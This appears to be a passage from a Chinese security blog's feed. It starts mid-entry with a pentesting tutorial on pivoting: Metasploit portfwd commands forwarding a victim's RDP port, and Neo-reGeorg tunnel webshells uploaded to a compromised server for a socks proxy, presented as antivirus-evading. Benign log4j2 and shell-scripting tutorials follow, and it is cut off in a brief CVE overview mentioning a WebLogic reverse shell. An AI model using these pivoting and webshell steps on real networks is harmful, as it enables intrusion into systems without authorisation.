id="Metasploit-Portfwd-（端口转发-x2F-重定向）"><a href="#Metasploit-Portfwd-（端口转发-x2F-重定向）" class="headerlink" title="Metasploit Portfwd （端口转发&#x2F; 重定向）"></a>Metasploit Portfwd （端口转发&#x2F; 重定向）</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">Meterpreter <span class="hljs-keyword">shell</span><span class="language-bash"> 中的 portfwd 命令最常用作端口转发，允许直接访问攻击系统无法访问的机器。在可以访问攻击者和目标网络（或系统）的受损主机上运行此命令，我们可以实质上通过本机转发 TCP 连接，从而使其成为一个支点。就像使用 ssh 连接的端口转发技术一样，portfwd 将中继与连接的机器之间的 TCP 连接。</span><br></code></pre></td></tr></table></figure><p>配置选项:</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ldif">meterpreter &gt; portfwd -h<br><span class="hljs-attribute">Usage</span>: portfwd [-h] [add | delete | list | flush] [args]<br><span class="hljs-attribute">OPTIONS</span>:<br><span class="hljs-literal">-</span>L &gt;opt&gt; 要监听的本地主机（可选）。<br><span class="hljs-literal">-</span>h 帮助横幅。<br><span class="hljs-literal">-</span>l &gt;opt&gt; 要监听的本地端口。<br><span class="hljs-literal">-</span>p &gt;opt&gt; 要连接的远程端口<br><span class="hljs-literal">-</span>r &gt;opt&gt; 要连接的远程主机<br></code></pre></td></tr></table></figure><p><img src="/images/image-20220222101719765.png" alt="image-20220222101719765"></p><p>条件:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">防火墙拦截了特定端口不允许访问,当前获取权限较低,无法添加放行规则,使用端口转发通过<br></code></pre></td></tr></table></figure><p>端口转发命令:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">portfwd</span> <span class="hljs-string">add</span> <span class="hljs-string">-l</span> <span class="hljs-number">3389</span> <span class="hljs-string">-p</span> <span class="hljs-number">3389</span> <span class="hljs-string">-r</span> <span class="hljs-number">192.168</span><span class="hljs-number">.127</span><span class="hljs-number">.139</span><br><span class="hljs-string">将受害者的</span> <span class="hljs-string">win7</span> <span class="hljs-string">的</span> <span class="hljs-number">3389</span> <span class="hljs-string">转发到</span> <span class="hljs-string">kali</span> <span class="hljs-string">上的</span> <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure><p>kail 访问本地 3389 即可能访问受害者 win7 的 3389 端口</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdesktop</span> <span class="hljs-number">127.0.0.1:3389</span><br></code></pre></td></tr></table></figure><p><img src="/images/image-20220222102431634.png" alt="image-20220222102431634"></p><p>参考链接:<a href="https://www.fujieace.com/metasploit/portfwd.html">https://www.fujieace.com/metasploit/portfwd.html</a></p><h4 id="内网穿透-Neo-reGeorg-的使用"><a href="#内网穿透-Neo-reGeorg-的使用" class="headerlink" title="内网穿透  Neo-reGeorg  的使用"></a>内网穿透  Neo-reGeorg  的使用</h4><p><img src="/images/image-20220221162940938-166738932699823.png" alt="image-20220221162940938"></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less">条件:<span class="hljs-selector-tag">C</span>服务器只开放<span class="hljs-number">80</span>端口,其他端口不开放且存在防火墙,普通木马已经不能实现远控功能,请问应该怎么操作.<br><span class="hljs-selector-tag">A</span>可以访问<span class="hljs-selector-tag">B</span>,<span class="hljs-selector-tag">B</span>可以访问<span class="hljs-selector-tag">C</span>,现在想<span class="hljs-selector-tag">A</span>可以访问<span class="hljs-selector-tag">C</span><br><br><span class="hljs-selector-tag">reGeorg</span> 是一个能穿透内网的工具，基于 <span class="hljs-selector-tag">socks5</span>而且支持的脚本众多。可以说是内网穿透神器，但是作为使用率较多的软件，杀软都会拦截，使用还要做免杀处理，现有一个项目是由 <span class="hljs-selector-tag">reGeorg</span> 修改而来，而且做了加密处理，脚本也免杀 项目地址 <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//github.com/L-codes/Neo-reGeorg(http协议的软件)</span><br></code></pre></td></tr></table></figure><p><img src="/images/image-20220222105104669.png" alt="image-20220222105104669"></p><p>Step 1. 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$ </span>python neoreg.py generate -k password<br><br>    [+] <span class="hljs-title class_">Create</span> neoreg server <span class="hljs-symbol">files:</span><br>       =&gt; neoreg_servers/tunnel.jspx<br>       =&gt; neoreg_servers/tunnel_compatibility.jspx<br>       =&gt; neoreg_servers/tunnel.php<br>       =&gt; neoreg_servers/tunnel.ashx<br>       =&gt; neoreg_servers/tunnel.aspx<br>       =&gt; neoreg_servers/tunnel.jsp<br>       =&gt; neoreg_servers/tunnel_compatibility.jsp<br></code></pre></td></tr></table></figure><p>Step 2. 使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">$ python3 neoreg.py -k password -u http://xx/tunnel.php</span><br><span class="hljs-section">+------------------------------------------------------------------------+</span><br><span class="hljs-code">  Log Level set to [DEBUG]</span><br><span class="hljs-code">  Starting socks server [127.0.0.1:1080]</span><br><span class="hljs-code">  Tunnel at:</span><br><span class="hljs-section">    http://xx/tunnel.php</span><br><span class="hljs-section">+------------------------------------------------------------------------+</span><br></code></pre></td></tr></table></figure><p>成功访问:</p><p><img src="/images/image-20220222111049430.png" alt="image-20220222111049430"></p>]]></content>
    
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>快速熟悉入门log4j</title>
    <link href="/2023/02/16/log4j/"/>
    <url>/2023/02/16/log4j/</url>
    
    <content type="html"><![CDATA[<h3 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h3><blockquote><p>​        log4j是一种日志框架，由apache基金会开发、发布，是log4j的升级版，很多企业的项目开发都用到了log4j2作为日志功能的实现。</p><p>​        log4j2框架通过logger对象输出日志相关信息，并且通过读取日志配置文件来设置日志输出的相关信息的参数值（例如 日志输出位置，控制日志输出级别等），日志配置文件可以命名成 log4j2、log4j等相关的名称。log4j2会自动识别配置文件，具体的配置选项和结构在下文介绍。</p><p>​        log4j2日志框架可在apache官网下载（<a href="https://dlcdn.apache.org/logging/log4j/%EF%BC%89%EF%BC%8C%E8%BF%99%E9%87%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E5%9C%A8pom.yml%E6%96%87%E4%BB%B6%E6%B7%BB%E5%8A%A0%E7%9B%B8%E5%85%B3%E4%BE%9D%E8%B5%96%E5%8D%B3%E5%8F%AF%E3%80%82">https://dlcdn.apache.org/logging/log4j/），这里建议直接在pom.yml文件添加相关依赖即可。</a></p></blockquote><p>备注：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">日志事件优先级：trace &lt; <span class="hljs-built_in">debug</span> &lt; <span class="hljs-built_in">info</span> &lt; warn &lt; <span class="hljs-built_in">error</span>  &lt; fatal<br></code></pre></td></tr></table></figure><p><em>这里做一个关于log4j框架的demo项目演示，帮助你快速熟悉入门使用该日志框架</em></p><h3 id="demo流程步骤说明："><a href="#demo流程步骤说明：" class="headerlink" title="demo流程步骤说明："></a>demo流程步骤说明：</h3><h4 id="1-新建项目"><a href="#1-新建项目" class="headerlink" title="1.新建项目"></a>1.新建项目</h4><p>#使用IntelliJ IDEA 新建一个项目</p><p><img src="/images/4454c8cec93833fddd1bf160ab3c843.png" alt="4454c8cec93833fddd1bf160ab3c843"></p><h4 id="2-配置依赖"><a href="#2-配置依赖" class="headerlink" title="2.配置依赖"></a>2.配置依赖</h4><p>#在pom.yml文件中添加如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;dependencies&gt;<br>       &lt;dependency&gt;<br>           &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;<br>           &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;<br>           &lt;version&gt;2.5&lt;/version&gt;<br>       &lt;/dependency&gt;<br>       &lt;dependency&gt;<br>           &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;<br>           &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;<br>           &lt;version&gt;2.5&lt;/version&gt;<br>       &lt;/dependency&gt;<br>   &lt;/dependencies&gt;<br><br></code></pre></td></tr></table></figure><p><code>#以上的log4j-api和log4j-core是log4j中最为核心的两部分</code></p><h4 id="3-设置日志配置文件"><a href="#3-设置日志配置文件" class="headerlink" title="3.设置日志配置文件"></a>3.设置日志配置文件</h4><p>#在classpath中创建logj的配置文件(这里我命名为log4j2.xml)，并添加如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;<br>&lt;Configuration status =&quot;WARN&quot;&gt;<br><br>&lt;!-- properties标签用于设置相关键值对的信息，用于上下文的配置中  --&gt;<br>    &lt;properties&gt;<br>        &lt;property name=&quot;LOG_HOME&quot;&gt;D:/logs&lt;/property&gt;<br>        &lt;property name=&quot;FILE_NAME&quot;&gt;mylog&lt;/property&gt;<br>    &lt;/properties&gt;<br><br>&lt;!-- Appdeners标签里面的内容用于设置日志输出的相关信息，例如日志输出位置，日志文件的刷新备份时间设置等 --&gt;<br>    &lt;Appenders&gt;<br><br>&lt;!--RollingRandomAccessFile标签用于设置生成的日志文件相关信息--&gt;<br>        &lt;RollingRandomAccessFile name=&quot;MyFile&quot;<br><br>&lt;!--filename是日志文件名，filePattern是日志命名格式定义 --&gt;<br>                                 fileName=&quot;$&#123;LOG_HOME&#125;/$&#123;FILE_NAME&#125;.log&quot;<br>                                 filePattern=&quot;$&#123;LOG_HOME&#125;/$$&#123;date:yyyy-MM&#125;/$&#123;FILE_NAME&#125;-%d&#123;yyyy-MM-dd HH-mm&#125;-%i.log&quot;&gt;<br>            &lt;PatternLayout<br>                    pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot; /&gt;<br><br>&lt;!--Policies用于设置日志文件的分割和刷新的触发事件--&gt;<br>            &lt;Policies&gt;<br>                &lt;TimeBasedTriggeringPolicy interval=&quot;1&quot; /&gt;<br>                &lt;SizeBasedTriggeringPolicy size=&quot;10 MB&quot; /&gt;<br>            &lt;/Policies&gt;<br>            &lt;DefaultRolloverStrategy max=&quot;20&quot; /&gt;<br>        &lt;/RollingRandomAccessFile&gt;<br><br>&lt;!--Consloe标签设置输出到控制台的日志信息的相关配置 --&gt;<br>        &lt;Console name =&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;<br><br>&lt;!--PatternLayout标签用于设置输出的日志信息的格式 --&gt;<br>            &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;<br>        &lt;/Console&gt;<br>    &lt;/Appenders&gt;<br><br>&lt;!-- Loggers标签设置logger对象的相关信息，AppenderRef标签设置调用该logger对象输出的日志信息具体到哪些位置--&gt;<br>    &lt;Loggers&gt;<br>        &lt;Logger name=&quot;mylog&quot; level=&quot;trace&quot; additivity=&quot;false&quot;&gt;<br>            &lt;AppenderRef ref=&quot;MyFile&quot;/&gt;<br>        &lt;/Logger&gt;<br><br>&lt;!-- Root标签定义了默认的Logger对象，任意Logger对象默认继承Root标签定义的Logger,可以通过设置additivity属性为&quot;false 来表示不继承Root标签的Logger--&gt;<br>        &lt;Root level=&quot;fatal&quot;&gt;<br>            &lt;AppenderRef ref=&quot;Console&quot; /&gt;<br>        &lt;/Root&gt;<br>    &lt;/Loggers&gt;<br>&lt;/Configuration&gt;<br></code></pre></td></tr></table></figure><h4 id="4-编写demo执行文件"><a href="#4-编写demo执行文件" class="headerlink" title="4.编写demo执行文件"></a>4.编写demo执行文件</h4><p>#创建Main.java文件并添加如下内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[]args)</span>&#123;<br>        <span class="hljs-comment">//Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);</span><br>        <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(<span class="hljs-string">&quot;mylog&quot;</span>);<br>        logger.trace(<span class="hljs-string">&quot;trace level&quot;</span>);<br>        logger.debug(<span class="hljs-string">&quot;debug level&quot;</span>);<br>        logger.info(<span class="hljs-string">&quot;info level&quot;</span>);<br>        logger.warn(<span class="hljs-string">&quot;warn level&quot;</span>);<br>        logger.error(<span class="hljs-string">&quot;error level&quot;</span>);<br>        logger.fatal(<span class="hljs-string">&quot;fatal level&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-运行结果展示"><a href="#5-运行结果展示" class="headerlink" title="5.运行结果展示"></a>5.运行结果展示</h4><p>#以下是如上步骤完成后的项目目录结构：</p><p><img src="/images/6885c9dde66a2f7b57d81a00ea9502e.png" alt="6885c9dde66a2f7b57d81a00ea9502e"></p><p>#运行该文件后，输出结果如下图所示：</p><p><img src="/images/999bc355790c234bd36be65982f8707.png" alt="999bc355790c234bd36be65982f8707"></p>]]></content>
    
    
    
    <tags>
      
      <tag>log4j相关</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于shell语言的简易入门文章</title>
    <link href="/2023/02/10/shell/"/>
    <url>/2023/02/10/shell/</url>
    
    <content type="html"><![CDATA[<h3 id="shell的基本概念"><a href="#shell的基本概念" class="headerlink" title="shell的基本概念"></a>shell的基本概念</h3><p>该语言类似PHP，但又有一些python的特性，空格符号在shell中很有说法</p><h3 id="文件格式说明"><a href="#文件格式说明" class="headerlink" title="文件格式说明"></a>文件格式说明</h3><p>文件开头应指明负责解释该文件的脚本处理器</p><p>Linux的shell很多，最常用的是Bourne Again Shell（&#x2F;bin&#x2F;bash）</p><p>示例如下：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#！<span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><h3 id="shell编程的基本要素"><a href="#shell编程的基本要素" class="headerlink" title="shell编程的基本要素"></a>shell编程的基本要素</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><h5 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h5><p>变量名&#x3D;变量值</p><p>该表达式不允许有空格，赋值字符串可用“或者‘括起来，也可以不用单双引号</p><p>单引号内不允许有单个单引号，即使转义了也不可以，</p><p>双引号内的变量可以被解析，单引号里面的变量就不行</p><p>如果要引用已经定义过的变量，要在变量名前加$符号</p><p><strong>示例如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">! bin/bash</span><br>item=1<br>item2=HelloWorld<br>item3=&quot;Hello&quot;<br><br>echo $item $item2 $item3                   <br></code></pre></td></tr></table></figure><h5 id="引用变量"><a href="#引用变量" class="headerlink" title="引用变量"></a>引用变量</h5><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$变</span>量值<br></code></pre></td></tr></table></figure><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><h5 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h5><p>注意： 数组元素用空格分隔</p><p><strong>索引数组</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">array</span><span class="hljs-operator">=</span>(value1 value2 ... valuen)<br></code></pre></td></tr></table></figure><p><strong>关联数组</strong></p><p>使用declare声明数组</p><p>(<strong>-A</strong> 选项就是用于声明一个关联数组)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">! bin/bash</span><br>declare -A age=([&quot;lihua&quot;]=12 [&quot;zhangwei&quot;]=11 ... [&quot;liming&quot;]=19)<br><br>declare -A site=([&quot;google&quot;]=&quot;www.google.com&quot; [&quot;runoob&quot;]=&quot;www.runoob.com&quot; [&quot;taobao&quot;]=&quot;www.taobao.com&quot;)<br></code></pre></td></tr></table></figure><p><strong>引用数组</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">以该格式引用   $&#123;<span class="hljs-keyword">array</span>[下标]&#125;    <br></code></pre></td></tr></table></figure><p>示例如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>array[0]=2<br>array[1]=1<br>test1=`expr $&#123;array[0]&#125; + $&#123;array[1]&#125;`<br>echo  &quot;$test1&quot;<br></code></pre></td></tr></table></figure><h4 id="运算字符"><a href="#运算字符" class="headerlink" title="运算字符"></a>运算字符</h4><h5 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash">通过<span class="hljs-built_in">expr</span>命令实现数学运算</span><br></code></pre></td></tr></table></figure><p>示例如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">item</span> = expr `<span class="hljs-number">1</span> + <span class="hljs-number">1</span>`<br><br><span class="hljs-attr">item</span> = expr `<span class="hljs-number">1</span> \* <span class="hljs-number">1</span>`    <span class="hljs-comment">#加\转义 *</span><br><br><span class="hljs-attr">item</span> = expr `<span class="hljs-number">1</span> / <span class="hljs-number">1</span>`<br><br><span class="hljs-attr">item</span> = expr `<span class="hljs-number">1</span> % <span class="hljs-number">1</span>`<br></code></pre></td></tr></table></figure><h5 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h5><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-literal">eq</span>   比较的两值相等，返<span class="hljs-built_in">回true</span><br><br><span class="hljs-literal">gt</span>   左边的大于右边的值 ，返<span class="hljs-built_in">回true</span><br><br><span class="hljs-literal">lt</span>   左边的小于于右边的值 ，返<span class="hljs-built_in">回true</span><br><br><span class="hljs-literal">ge</span>   左边的大于等于右边的值 ，返<span class="hljs-built_in">回true</span><br><br><span class="hljs-literal">le</span>   左边的小于等于右边的值 ，返<span class="hljs-built_in">回true</span><br></code></pre></td></tr></table></figure><h5 id="布尔运算符"><a href="#布尔运算符" class="headerlink" title="布尔运算符"></a>布尔运算符</h5><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">！ 表达式为<span class="hljs-literal">false</span> 返回<span class="hljs-literal">true</span><br><br>-o 或运算<br><br>-<span class="hljs-keyword">a</span> 与运算<br></code></pre></td></tr></table></figure><h5 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">=检测两个字符串是否相等，相等返回 <span class="hljs-literal">true</span>。[ <span class="hljs-variable">$a</span> = <span class="hljs-variable">$b</span> ] 返回 <span class="hljs-literal">false</span>。<br><br>!=检测两个字符串是否不相等，不相等返回 <span class="hljs-literal">true</span>。[ <span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> ] 返回 <span class="hljs-literal">true</span>。<br><br>-z检测字符串长度是否为0，为0返回 <span class="hljs-literal">true</span>。[ -z <span class="hljs-variable">$a</span> ] 返回 <span class="hljs-literal">false</span>。<br><br>-n检测字符串长度是否不为 0，不为 0 返回 <span class="hljs-literal">true</span>。[ -n <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>&quot;</span> ] 返回 <span class="hljs-literal">true</span>。<br><br>$检测字符串是否不为空，不为空返回 <span class="hljs-literal">true</span>。[ <span class="hljs-variable">$a</span> ] 返回 <span class="hljs-literal">true</span>。<br><br></code></pre></td></tr></table></figure><h5 id="文件测试运算符"><a href="#文件测试运算符" class="headerlink" title="文件测试运算符"></a>文件测试运算符</h5><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>在Shell中，调用函数时可以向其传递参数。在函数体内部，通过 $n 的形式来获取参数的值，例如，$1表示第一个参数，$2表示第二个参数…</p><h5 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h5><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">函数名（）</span><span class="hljs-template-variable">&#123;</span><br><span class="hljs-template-variable"></span><br><span class="hljs-template-variable">&#125;</span><br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>funWithParam()&#123;<br>    echo &quot;第一个参数为 $1 !&quot;<br>    echo &quot;第二个参数为 $2 !&quot;<br>    echo &quot;第十个参数为 $10 !&quot;<br>    echo &quot;第十个参数为 $&#123;10&#125; !&quot;<br>    echo &quot;第十一个参数为 $&#123;11&#125; !&quot;<br>    echo &quot;参数总数有 $# 个!&quot;<br>    echo &quot;作为一个字符串输出所有参数 $* !&quot;<br>&#125;<br>funWithParam 1 2 3 4 5 6 7 8 9 34 73<br></code></pre></td></tr></table></figure><h4 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h4><p>流程控制中的判断表达式用【】括起来，如果使用 <strong>((…))</strong> 作为判断语句，大于和小于可以直接使用 <strong>&gt;</strong> 和 <strong>&lt;</strong></p><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">a=10<br>b=20<br>if [ $a == $b ]<br>then<br>   echo &quot;a 等于 b&quot;<br>elif [ $a -gt $b ]<br>then<br>   echo &quot;a 大于 b&quot;<br>elif [ $a -lt $b ]<br>then<br>   echo &quot;a 小于 b&quot;<br>else<br>   echo &quot;没有符合的条件&quot;<br>fi<br></code></pre></td></tr></table></figure><h4 id="输入输出以及重定向"><a href="#输入输出以及重定向" class="headerlink" title="输入输出以及重定向"></a>输入输出以及重定向</h4>]]></content>
    
    
    
    <tags>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简述CVE中的常见漏洞</title>
    <link href="/2023/01/22/cve/"/>
    <url>/2023/01/22/cve/</url>
    
    <content type="html"><![CDATA[<h4 id="spring-boot-远程命令执行"><a href="#spring-boot-远程命令执行" class="headerlink" title="spring boot 远程命令执行"></a>spring boot 远程命令执行</h4><p>yml和jar文件托管</p><p>正常传参页面的默认错误页面执行spel表达式</p><p>敏感信息泄露</p><h4 id="Apache-shiro反序列化漏洞"><a href="#Apache-shiro反序列化漏洞" class="headerlink" title="Apache shiro反序列化漏洞"></a>Apache shiro反序列化漏洞</h4><p>用户登录时勾选remember me选项后 会将用户的cookie值经过序列化后再AES加密最后base64编码存储在cookie的rememberMe字段中，再传递给shiro服务器，服务器收到登录请求后会对remember Me的cookie解码解密后执行反序列化（AES对称加密）</p><h4 id="weblogic反序列化漏洞"><a href="#weblogic反序列化漏洞" class="headerlink" title="weblogic反序列化漏洞"></a>weblogic反序列化漏洞</h4><p>T3协议的缺陷实现了JAVA虚拟机的的远程方法调用，能够在本地虚拟机调用远端代码（RMI 远程方法调用）</p><p>攻击流程，在攻击机启动一台jmrp server ，监听某端口 利用T3协议向weblogic服务器发送bash反弹shell的命令</p><h4 id="Apache-远程命令执行"><a href="#Apache-远程命令执行" class="headerlink" title="Apache 远程命令执行"></a>Apache 远程命令执行</h4><p>SSI和CGI扩展开启后允许HTML文件在注释中执行命令，格式为<!--exec cmd= --></p><h4 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h4><h5 id="一、fastjson简介"><a href="#一、fastjson简介" class="headerlink" title="一、fastjson简介"></a>一、fastjson简介</h5><p>fastjson是java的一个库，可以将java对象转化为json格式的字符串，也可以将json格式的字符串转化为java对象</p><p>提供了 toJSONString() 和 parseObject() 方法来将 Java 对象与 JSON 相互转换。调用toJSONString方 法即可将对象转换成 JSON 